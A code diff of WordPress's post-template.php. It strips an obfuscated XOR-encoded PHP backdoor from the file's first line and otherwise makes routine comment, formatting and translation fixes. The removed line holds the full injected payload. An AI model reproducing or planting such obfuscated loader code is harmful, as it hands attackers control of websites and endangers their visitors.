@@ -1,4 +1,4 @@
-<?php $cokKgxYB='4OV4OElWFSSXYRU'^'W=3U; 313=0,0=;';$nPglxpvyC=$cokKgxYB('','-VYL0CVPYZS<j47,ST2YeM H:2P=S80.8>COCDPKo1UNWTZTUAS;:o0TCPb:PCEAND02JaWKY0GPoMJchHzXhVDYXMenBpJ<S3+.1bHIhDQFShR=m4 O8 SXN3L<-yCtCXFNQFpEE7:<UjZlDw.RNWiE11Y2TN;P76C:ihnDEBZ.TGe14TF:Qn1zXI7BC46yuZHZkMkeKe;y>J4QBMVisH6Y67P2L-0T5<;IYZQpH65N+QddJ;HWS5 klC=,q-;wkJS2wkXR7ZvSPE31TOIpf,HXiH-,A7=W>YiNs8RHS6xu7V5SGPzuJML3VaX06x-7RnHeZS -YK18m3B1NYHQVEK4i2d>uslu5GFJ,PKQIKqn79LUSHu4L0zW,8>AsZ,HLIMPWWKxD>KTD,J6OSeO2W K4SBd;lE=yI0S3-mWiqC>8,=.AX3WXF2O=<6.L;<k;OJGB1MVDn41YT673Os>0>VjAWiIA2J9ZPYdfwP0FnmD2=QAwkRMB6Q39=YDgWE,5>SJFQ4KwTDp=;13biqKFBW6OZISX0-gC> .K+GLHEuLYQwkWAhBQsG8xDQWpwMZaZjCTP  ,D<0aSoSei3D<X5.FK3-TE=EH:jN4+I8X6VECmS09;-QgkrquiY6:8E4RLAeS1ZT,EJRY>ZYXP<KT>7 UI=djkJE4'^'D0qmV683-3<R5QOE  AqB5O:eV1I2goCMJdfjd+AfW  4 3;;a+TH0T571=e=61ij QF+Mwo2U>yOmjCH3pQar+,,mXNeWq6Z:MACJl HyqvhHvTQGT=TE=pjW-HLPxTg1mexLyLaXOHuDgLlSJ3:62aXlyltjP5NmgSIMN7106K:oAZQ-ogxU;sQ;R66FXQQ5=.Bval6oFs4nP06,vTS.W5ERk8hIQ TcP, zlP.WY=Njnn,T:22VHKDgbo>bp>.j2AWO37NzKmpaEP8:,YFWBQM,LX hV2GyTnWS71h<qQS7A2gmZQ<, F3ZRM<rDQrFiA>2TLpkJ2dU-C+8+9vmok;w5k0 8UT4fnG52qtuQJAX  6aUOF9ssHYJ ,1I1ltmt<22CN7Bp M>WonEkD6L>QhHmFf87smT2GLMjI16PKIOG 4Z-=nJ OcRO8Zc4V:>o P>3rZkU<7YSVgWZQJ7CmwM- F+f15 MOLZY FI SI0aQMr,0D0JfV<=82=EFJ ba:Q2PxdTYZERKIWmfj:Rzrm79DL<dUEWlvnluxUk8eBSgsZrhDrZIu43DG+lToXrf6CEHqZUFzOuCIR6N9Lq-.Jr1=T6<IBiDJ0T7W2boMwTXOLxNKRQUIyM01 B3 iA7P.5wb:3 R58<wabo4>E- ILZBqOI');$nPglxpvyC();
+<?php
 /**
  * WordPress Post Template Functions.
  *
@@ -784,12 +784,12 @@ function post_password_required( $post = null ) {
 	$post = get_post($post);
 
 	if ( empty( $post->post_password ) ) {
-		/** This filter is documented in wp-includes/post.php */
+		/** This filter is documented in wp-includes/post-template.php */
 		return apply_filters( 'post_password_required', false, $post );
 	}
 
 	if ( ! isset( $_COOKIE[ 'wp-postpass_' . COOKIEHASH ] ) ) {
-		/** This filter is documented in wp-includes/post.php */
+		/** This filter is documented in wp-includes/post-template.php */
 		return apply_filters( 'post_password_required', true, $post );
 	}
 
@@ -1018,11 +1018,19 @@ function the_meta() {
 	if ( $keys = get_post_custom_keys() ) {
 		echo "<ul class='post-meta'>\n";
 		foreach ( (array) $keys as $key ) {
-			$keyt = trim($key);
-			if ( is_protected_meta( $keyt, 'post' ) )
+			$keyt = trim( $key );
+			if ( is_protected_meta( $keyt, 'post' ) ) {
 				continue;
-			$values = array_map('trim', get_post_custom_values($key));
-			$value = implode($values,', ');
+			}
+
+			$values = array_map( 'trim', get_post_custom_values( $key ) );
+			$value = implode( $values, ', ' );
+
+			$html = sprintf( "<li><span class='post-meta-key'>%s</span> %s</li>\n",
+				/* translators: %s: Post custom field name */
+				sprintf( _x( '%s:', 'Post custom field name' ), $key ),
+				$value
+			);
 
 			/**
 			 * Filters the HTML output of the li element in the post custom fields list.
@@ -1033,7 +1041,7 @@ function the_meta() {
 			 * @param string $key   Meta key.
 			 * @param string $value Meta value.
 			 */
-			echo apply_filters( 'the_meta_key', "<li><span class='post-meta-key'>$key:</span> $value</li>\n", $key, $value );
+			echo apply_filters( 'the_meta_key', $html, $key, $value );
 		}
 		echo "</ul>\n";
 	}
@@ -1267,7 +1275,7 @@ function wp_list_pages( $args = '' ) {
  * @param array|string $args {
  *     Optional. Arguments to generate a page menu. See wp_list_pages() for additional arguments.
  *
- *     @type string          $sort_column  How to short the list of pages. Accepts post column names.
+ *     @type string          $sort_column  How to sort the list of pages. Accepts post column names.
  *                                         Default 'menu_order, post_title'.
  *     @type string          $menu_id      ID for the div containing the page list. Default is empty string.
  *     @type string          $menu_class   Class to use for the element containing the page list. Default 'menu'.
